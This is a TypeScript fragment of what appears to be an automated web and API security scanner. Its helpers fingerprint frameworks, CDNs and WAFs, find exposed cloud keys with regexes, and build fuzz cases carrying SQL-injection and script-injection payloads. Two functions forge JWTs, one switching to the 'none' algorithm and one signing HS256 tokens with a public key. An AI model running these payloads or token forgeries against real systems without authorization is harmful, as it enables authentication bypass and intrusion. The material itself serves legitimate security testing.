  const baseTargets = new Set<string>();
  if (ctx.normalized?.baseUrl) baseTargets.add(ctx.normalized.baseUrl);
  (ctx.artifacts.recon.liveHosts || []).forEach((host: string) => baseTargets.add(host));
  return Array.from(baseTargets);
}

function matchesAny(target: string, patterns: string[]): boolean {
  return patterns.some((pattern) => new RegExp(pattern).test(target));
}

function scanExposedKeys(source: string): any {
  const awsKeyPattern = /AKIA[0-9A-Z]{16}/g;
  const awsSecretPattern = /(?:aws_secret_access_key|aws_secret)[\s:=]+["'`]?([A-Za-z0-9/+=]{40})/gi;
  const gcpKeyPattern = /AIza[0-9A-Za-z\-_]{35}/g;
  const azureKeyPattern = /(?:AccountKey=)([A-Za-z0-9+/=]{80,})/g;

  const matches = {
    awsKeys: Array.from(new Set(source.match(awsKeyPattern) || [])),
    awsSecrets: [] as string[],
    gcpKeys: Array.from(new Set(source.match(gcpKeyPattern) || [])),
    azureKeys: Array.from(new Set(source.match(azureKeyPattern) || [])),
  };

  let match: RegExpExecArray | null;
  while ((match = awsSecretPattern.exec(source)) !== null) {
    matches.awsSecrets.push(match[1]);
  }
  matches.awsSecrets = Array.from(new Set(matches.awsSecrets));

  return matches;
}

function classifyStatusRisk(statuses: number[]): 'info' | 'low' | 'medium' | 'high' {
  if (statuses.some((s) => s >= 500)) return 'high';
  if (statuses.some((s) => s === 429)) return 'low';
  if (statuses.some((s) => s >= 400 && s < 500)) return 'medium';
  return 'info';
}

function classifyBolaRisk(results: any[]): 'low' | 'medium' | 'high' {
  if (results.some((r) => r.different && r.status === 200)) return 'high';
  if (results.some((r) => r.status === 403)) return 'medium';
  return 'low';
}

function buildFuzzCases(params: Record<string, any>, maxCases: number): Record<string, any>[] {
  const variants: Record<string, any[]> = {};
  for (const [key, value] of Object.entries(params)) {
    if (typeof value === 'number') {
      variants[key] = [value, value + 1, value - 1, 0, -1, 999999];
    } else if (typeof value === 'boolean') {
      variants[key] = [true, false];
    } else {
      const str = String(value);
      variants[key] = [
        str,
        '',
        'null',
        'undefined',
        `' OR '1'='1`,
        '<script>alert(1)</script>',
      ];
    }
  }

  const keys = Object.keys(variants);
  const cases: Record<string, any>[] = [];
  function backtrack(idx: number, current: Record<string, any>) {
    if (cases.length >= maxCases) return;
    if (idx === keys.length) {
      cases.push({ ...current });
      return;
    }
    const key = keys[idx];
    for (const val of variants[key]) {
      current[key] = val;
      backtrack(idx + 1, current);
      if (cases.length >= maxCases) return;
    }
  }
  backtrack(0, {});
  return cases;
}

function detectWaf(body: string): boolean {
  const normalized = body.toLowerCase();
  return LIMITS.wafPatterns.some((pattern) => normalized.includes(pattern));
}

function detectJwtInText(text: string): boolean {
  return /eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+/.test(text);
}

function toNoneJwt(token: string): string {
  const parts = token.split('.');
  if (parts.length < 2) return token;
  const header = JSON.parse(Buffer.from(parts[0], 'base64').toString('utf-8'));
  const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf-8'));
  const newHeader = { ...header, alg: 'none' };
  return `${base64Url(JSON.stringify(newHeader))}.${base64Url(JSON.stringify(payload))}.`;
}

function forgeHs256(token: string, publicKey: string): string {
  const parts = token.split('.');
  if (parts.length < 2) return token;
  const header = JSON.parse(Buffer.from(parts[0], 'base64').toString('utf-8'));
  const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf-8'));
  const newHeader = { ...header, alg: 'HS256' };
  return signHs256(newHeader, payload, publicKey);
}

function base64Url(input: Buffer | string): string {
  const buf = Buffer.isBuffer(input) ? input : Buffer.from(input);
  return buf.toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function signHs256(header: any, payload: any, secret: string): string {
  const head = base64Url(JSON.stringify(header));
  const body = base64Url(JSON.stringify(payload));
  const data = `${head}.${body}`;
  const sig = crypto.createHmac('sha256', secret).update(data).digest();
  return `${data}.${base64Url(sig)}`;
}

async function logExecution(ctx: FlowContext, entry: any): Promise<void> {
  await fs.ensureDir(EXEC_LOG_DIR);
  const logEntry = { ...entry, timestamp: new Date().toISOString() };
  ctx.logs.push(logEntry);
  await fs.appendFile(EXEC_LOG_FILE, JSON.stringify(logEntry) + '\n');
}

function hashBody(body: any): string {
  const value = typeof body === 'string' ? body : JSON.stringify(body);
  return crypto.createHash('sha256').update(value).digest('hex');
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function resolveCname(hostname: string): Promise<string | null> {
  const hasDig = await checkCommandExists('dig');
  if (!hasDig) return null;
  try {
    const result = await runCommand('dig', ['+short', 'CNAME', hostname]);
    const cname = result.stdout.split('\n').find((s) => s.trim().length > 0);
    return cname ? cname.replace(/\.$/, '') : null;
  } catch {
    return null;
  }
}

function extractTitle(body: string): string | null {
  const match = body.match(/<title[^>]*>([^<]+)<\/title>/i);
  return match ? match[1].trim() : null;
}

function detectFramework(headers: Record<string, any>, body: string): string[] {
  const hints: string[] = [];
  const lower = body.toLowerCase();
  const powered = (headers['x-powered-by'] || '').toString().toLowerCase();
  if (lower.includes('__next') || powered.includes('next')) hints.push('Next.js');
  if (powered.includes('laravel')) hints.push('Laravel');
  if (powered.includes('express')) hints.push('Express');
  if (powered.includes('django') || lower.includes('csrfmiddlewaretoken')) hints.push('Django');
  if (powered.includes('rails') || lower.includes('csrf-token')) hints.push('Rails');
  return Array.from(new Set(hints));
}

function detectCloudHints(headers: Record<string, any>, body: string): string[] {
  const hints: string[] = [];
  const lower = body.toLowerCase();
  const server = (headers['server'] || '').toString().toLowerCase();
  if (server.includes('amazon') || lower.includes('aws')) hints.push('AWS');
  if (server.includes('google') || lower.includes('gcp')) hints.push('GCP');
  if (server.includes('azure') || lower.includes('microsoft')) hints.push('Azure');
  return Array.from(new Set(hints));
}

function detectCdnWaf(headers: Record<string, any>, body: string): string[] {
  const hints: string[] = [];
  const lower = body.toLowerCase();
  const server = (headers['server'] || '').toString().toLowerCase();
  const via = (headers['via'] || '').toString().toLowerCase();
  if (server.includes('cloudflare') || lower.includes('cloudflare')) hints.push('Cloudflare');
  if (server.includes('akamai') || lower.includes('akamai')) hints.push('Akamai');
  if (via.includes('fastly')) hints.push('Fastly');
  return Array.from(new Set(hints));
}

function modelSeverity(finding: any): 'low' | 'medium' | 'high' | 'critical' {
  const type = (finding.type || '').toLowerCase();
  if (type.includes('jwt none') || type.includes('auth bypass')) return 'critical';
  if (type.includes('bola') || type.includes('idor')) return 'high';
  if (type.includes('exposed') || type.includes('graphql')) return 'high';
  if (type.includes('csp')) return 'medium';
  return finding.severity || 'low';
}
